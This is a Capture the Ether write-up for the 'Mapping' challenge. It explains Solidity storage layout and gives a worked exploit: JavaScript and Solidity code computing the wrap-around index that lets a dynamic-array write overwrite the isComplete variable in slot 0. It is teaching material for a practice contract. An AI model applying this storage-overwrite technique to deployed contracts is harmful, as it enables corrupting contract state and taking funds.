# Mapping

## Required Concepts

According to the [Solidity docs](https://solidity.readthedocs.io/en/v0.4.20/miscellaneous.html#layout-of-state-variables-in-storage), static variables are stored in the order they are declared, starting at ```0```. The storage system in Ethereum is most easily understood as a very large array. Memory locations in Ethereum are called slots. Each Ethereum smart contract has ```2**256``` slots. Each slot maps to a 32 byte value. All slots are initially set to ```bytes32(0)```.

Dynamically sized arrays are stored a little differently to account for the uncertain amount of storage that might be needed throughout the life of the smart contract. For this reason, dynamic arrays (with the exception of ```byte``` arrays and ```strings```; see the docs) only occupy one slot when they are declared. The difference is that this slot is only occupied by the current ```length``` of the dynamically sized array. The actual storage location for the contents of this value type is then determined by the ```keccak256``` hash of the dynamic array's slot position. Each element within the array is stored sequentially starting with that hash value. As an example, if the dynamic array was the third variable to be declared then each item would be stored sequentially from the ```keccak256``` hash of ```bytes32(2)```.

For more on this topic check out this [multi-part series on Ethereum's Virtual Machine](https://blog.qtum.org/diving-into-the-ethereum-vm-6e8d5d2f3c30).

The order in which variables are declared can also affect the number of slots used when the Solidity code is compiled. Given that one slot is 32 bytes, if 4 variables are declared in this order:
```
uint256 a;
uint128 b;
uint256 c;
uint128 d;
```
These 4 variables will occupy 4 slots. But when rearranged like this:
```
uint256 a;
uint128 b;
uint128 d;
uint256 c;
```
They only take up 3 slots because the two uint128 variables are packed into one slot.

This implies that the order of variable declaration in Solidity matters.

From what we already know about an Ethereum smart contract's storage, we can deduce that the max length of a dynamic array would be the max allowable value of the smart contract's own storage array. The max slot of the storage area is ```2**256 - 1``` so the max size of a dynamic array would be ```2**256 - 1```. If this were the case, the dynamic array would then have the ability to point and re-write over any variable in contract storage given that the location of the target variable is known.

## Challenge
Source: https://capturetheether.com/challenges/math/mapping/
>Who needs mappings? I’ve created a contract that can store key/value pairs using just an array.
```
pragma solidity ^0.4.21;

contract MappingChallenge {
    bool public isComplete;
    uint256[] map;

    function set(uint256 key, uint256 value) public {
        // Expand dynamic array as needed
        if (map.length <= key) {
            map.length = key + 1;
        }

        map[key] = value;
    }

    function get(uint256 key) public view returns (uint256) {
        return map[key];
    }
}
```

## Solution

Exploiting the dynamic array is the key to this puzzle. The ```set``` function gives the participant the ability to expand the array to any size and set the value at that position. For more info on this exploit, check out: https://github.com/Arachnid/uscc/tree/master/submissions-2017/doughoyte

To solve this puzzle, we must find the location of our target key-value pair: ```isComplete```. The value of an unset variable is ```0``` (```false```). We need to set it to ```1``` (```true```). Using Javascript:
```
const webThree = require('web3');
const bn = require('bn.js');

let web3 = new webThree(new webThree.providers.HttpProvider(
  'https://ropsten.infura.io/APIKEY'
));

// following values are uint256 hex encoded
// slot = 1
let slot = '0x0000000000000000000000000000000000000000000000000000000000000001';
// index = 0
let index = '0x0000000000000000000000000000000000000000000000000000000000000000';
// elementSide = 32
let elementSize = '0x0000000000000000000000000000000000000000000000000000000000000020';
// Value in memory we'd like to manipulate, targetMemoryLocation = 0
let targetMemoryLocation = '0x0000000000000000000000000000000000000000000000000000000000000000'

/*
key = 2**256 - keccak256(slot) + (index * elementSize) + targetMemoryLocation
key = 2**256 - keccak256(slot) + (0 * 32) + 0
key = 2**256 - keccak256(slot)
*/


let hashSlot = web3.utils.sha3(slot);
// return: 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6

// the calculation below is not accurate enough for our application
let maxUint = 2**256;
maxUint = maxUint.toString(10);
// return: 1.157920892373162e+77

// As you can see, Javascript sucks at big/little - endian values
// This library is a work around for this issue
let a = new bn('2', 10);
let b = new bn('256', 10);

let result = a.pow(b);
// return: "115792089237316195423570985008687907853269984665640564039457584007913129639936"

// strip hex prefix and create a big number from the sha3 hash
hashSlot = new bn(hashSlot.substring(2), 16);

let key = result.sub(hashSlot);
// return: 35707666377435648211887908874984608119992236509074197713628505308453184860938

// convert to hex:
key = web3.utils.toHex(key);
// return: 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
```

Alternatively, we can use this solidity contract to do the same thing:
```
pragma solidity ^0.4.24;

contract cove {
   // arrLocation(1,0,32,2,0)
   function arrLocation(uint256 slot, uint256 index, uint256 elementSize, uint256 _two, uint256 _targetMemoryLocation)
    public
    view
    returns (bytes32)
    {
        return bytes32((_two ** 256) - uint256(keccak256(slot)) + (index * elementSize) + _targetMemoryLocation);
    }
}
```
This also returns (base 16):
```
"0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a"
```
or (base 10):
```
"35707666377435648211887908874984608119992236509074197713628505308453184860938"
```

To solve this puzzle call the ```set``` function, to re-assign the ```isComplete``` value to ```true```.

* set(key,value), where...
```
key = "0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a"
value = 1
```
